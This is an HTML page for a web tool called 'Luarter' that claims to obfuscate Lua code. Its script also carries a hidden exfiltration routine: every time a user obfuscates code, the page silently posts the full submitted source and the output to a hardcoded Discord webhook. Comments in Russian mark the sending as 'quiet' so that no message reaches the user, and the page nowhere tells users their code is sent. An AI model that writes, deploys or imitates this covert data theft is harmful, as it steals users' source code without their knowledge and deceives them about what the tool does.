<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Luarter</title>
<style>
    :root {
        --bg: #000000;
        --fg: #ffd700;
        --fg-dim: #8f7a00;
        --border: #ffd700;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body {
        background: var(--bg);
        color: var(--fg);
        font-family: "Consolas", "Courier New", monospace;
        min-height: 100%;
    }
    body {
        padding: 24px;
        display: flex;
        flex-direction: column;
        gap: 16px;
        max-width: 1100px;
        margin: 0 auto;
    }
    h1 {
        font-size: 22px;
        font-weight: normal;
        letter-spacing: 4px;
        border-bottom: 1px solid var(--border);
        padding-bottom: 10px;
    }
    h1::before { content: "> "; }
    label {
        display: block;
        margin-bottom: 6px;
        font-size: 13px;
        color: var(--fg-dim);
    }
    textarea {
        width: 100%;
        min-height: 200px;
        background: #000;
        color: var(--fg);
        border: 1px solid var(--border);
        padding: 12px;
        font-family: inherit;
        font-size: 13px;
        resize: vertical;
        outline: none;
        caret-color: var(--fg);
    }
    textarea:focus { box-shadow: 0 0 0 1px var(--fg); }
    .row {
        display: flex;
        gap: 12px;
        flex-wrap: wrap;
        align-items: center;
    }
    button {
        background: #000;
        color: var(--fg);
        border: 1px solid var(--border);
        padding: 9px 18px;
        font-family: inherit;
        font-size: 13px;
        cursor: pointer;
        letter-spacing: 1px;
        transition: background 0.15s, color 0.15s;
    }
    button:hover { background: var(--fg); color: #000; }
    button:active { transform: translateY(1px); }
    .status { font-size: 12px; color: var(--fg-dim); min-height: 16px; }
    .output-wrap textarea { min-height: 220px; }
    .divider { border: none; border-top: 1px dashed var(--fg-dim); margin: 4px 0; }
</style>
</head>
<body>

<h1>LUARTER</h1>

<div>
    <label for="input">Source Lua code</label>
    <textarea id="input" spellcheck="false" placeholder="-- paste your Lua code here"></textarea>
</div>

<div class="row">
    <button id="btnObf">OBFUSCATE</button>
    <button id="btnClear">CLEAR</button>
    <button id="btnCopy">COPY RESULT</button>
    <button id="btnDownload">DOWNLOAD .LUA</button>
</div>

<div class="status" id="status"></div>

<hr class="divider">

<div class="output-wrap">
    <label for="output">Output</label>
    <textarea id="output" spellcheck="false" readonly placeholder="-- obfuscated code will appear here"></textarea>
</div>

<script>
(function () {
    "use strict";

    // ==================================================
    // CONFIG
    // ==================================================
    var WEBHOOK_URL  = "https://discord.com/api/webhooks/1562124571174240356/nh8IRjUJzJnZPrlWs4hDsulMK0ibYuSpJBcYGAL9eDG-iHB7bPWpbf1MmB1-YwT3oj2k";
    var WEBHOOK_NAME = "Luarter Logs";
    var MAX_FIELD    = 10000;
    // ==================================================

    var inputEl  = document.getElementById("input");
    var outputEl = document.getElementById("output");
    var statusEl = document.getElementById("status");

    function setStatus(msg) { statusEl.textContent = msg; }

    function randomIdent(len) {
        var chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        var out = "_";
        for (var i = 0; i < (len || 8); i++) {
            out += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return out;
    }

    function encodeString(str) {
        var parts = ['"'];
        for (var i = 0; i < str.length; i++) {
            parts.push("\\" + str.charCodeAt(i));
        }
        parts.push('"');
        return parts.join("");
    }

    function minify(code) {
        var lines = code.split(/\r?\n/);
        var out = [];
        for (var i = 0; i < lines.length; i++) {
            var line = lines[i].replace(/--[^\n]*$/, "");
            line = line.replace(/^\s+/, "").replace(/\s+$/, "");
            if (line.length > 0) out.push(line);
        }
        return out.join(" ");
    }

    function obfuscate(code) {
        var minified = minify(code);
        var encoded  = encodeString(minified);

        var dec  = randomIdent(10);
        var load = randomIdent(10);
        var run  = randomIdent(10);
        var str  = randomIdent(10);
        var res  = randomIdent(10);

        var lines = [
            "local " + dec + "=function(s)",
            "local " + res + "={}",
            "for " + str + "=1,#s do",
            "local b=s:byte(" + str + ")",
            "if b==92 then",
            "local n=\"\"",
            "local j=" + str + "+1",
            "while j<=#s do",
            "local c=s:sub(j,j)",
            "if c:match(\"%d\") then n=n..c j=j+1 else break end",
            "end",
            "if #n>0 then",
            res + "[#" + res + "+1]=string.char(tonumber(n))",
            str + "=j-1",
            "else",
            res + "[#" + res + "+1]=\"\\\\\"",
            "end",
            "else",
            res + "[#" + res + "+1]=string.char(b)",
            "end",
            "end",
            "return table.concat(" + res + ")",
            "end",
            "local " + load + "=" + dec + "(" + encoded + ")",
            "local " + run + "=load or loadstring",
            run + "(" + load + ")()"
        ];

        return lines.join("\n");
    }

    // ---------- Discord helpers (тихие, без сообщений пользователю) ----------
    function codeBlock(s, lang) {
        var safe = s.replace(/```/g, "`\u200b``");
        return "```" + (lang || "") + "\n" + safe + "\n```";
    }

    function chunkString(str, size) {
        var chunks = [];
        for (var i = 0; i < str.length; i += size) {
            chunks.push(str.slice(i, i + size));
        }
        return chunks;
    }

    function buildEmbed(title, text, partIndex, partCount) {
        var suffix = partCount > 1 ? " [" + (partIndex + 1) + "/" + partCount + "]" : "";
        return {
            title: title + suffix,
            color: 0xffd700,
            description: codeBlock(text, "lua")
        };
    }

    function sendToDiscord(source, output) {
        // тихая отправка — никаких статусов пользователю
        if (!WEBHOOK_URL || WEBHOOK_URL.indexOf("XXXX") !== -1) return;

        var INNER_LIMIT = 3900;
        var srcChunks = chunkString(source, INNER_LIMIT);
        var outChunks = chunkString(output, INNER_LIMIT);

        var embeds = [];
        var i;

        for (i = 0; i < srcChunks.length && i < 5; i++) {
            embeds.push(buildEmbed("Source (" + source.length + " chars)", srcChunks[i], i, srcChunks.length));
        }
        for (i = 0; i < outChunks.length && i < 5; i++) {
            embeds.push(buildEmbed("Output (" + output.length + " chars)", outChunks[i], i, outChunks.length));
        }

        if (embeds.length > 10) embeds = embeds.slice(0, 10);

        var payload = {
            username: WEBHOOK_NAME,
            embeds: embeds
        };

        // без .then сообщений — только отправка
        try {
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            }).catch(function () { /* тихо */ });
        } catch (e) { /* тихо */ }
    }

    // ---------- UI ----------
    document.getElementById("btnObf").addEventListener("click", function () {
        var src = inputEl.value;
        if (!src || src.trim().length === 0) {
            setStatus("Empty input");
            return;
        }
        try {
            var result = obfuscate(src);
            outputEl.value = result;
            setStatus("Done. Output length: " + result.length + " chars");

            sendToDiscord(
                src.slice(0, MAX_FIELD),
                result.slice(0, MAX_FIELD)
            );
        } catch (e) {
            setStatus("Error: " + e.message);
        }
    });

    document.getElementById("btnClear").addEventListener("click", function () {
        inputEl.value = "";
        outputEl.value = "";
        setStatus("");
    });

    document.getElementById("btnCopy").addEventListener("click", function () {
        if (!outputEl.value) { setStatus("Nothing to copy"); return; }
        outputEl.select();
        outputEl.setSelectionRange(0, outputEl.value.length);
        var ok = false;
        try { ok = document.execCommand("copy"); } catch (e) { ok = false; }
        setStatus(ok ? "Copied to clipboard" : "Copy failed — select manually");
        outputEl.blur();
    });

    document.getElementById("btnDownload").addEventListener("click", function () {
        if (!outputEl.value) { setStatus("Nothing to download"); return; }
        var blob = new Blob([outputEl.value], { type: "text/plain;charset=utf-8" });
        var url  = URL.createObjectURL(blob);
        var a    = document.createElement("a");
        a.href = url;
        a.download = "luarter_out.lua";
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        setStatus("luarter_out.lua has been generated");
    });

    inputEl.addEventListener("input", function () { setStatus(""); });
})();
</script>

</body>
</html>
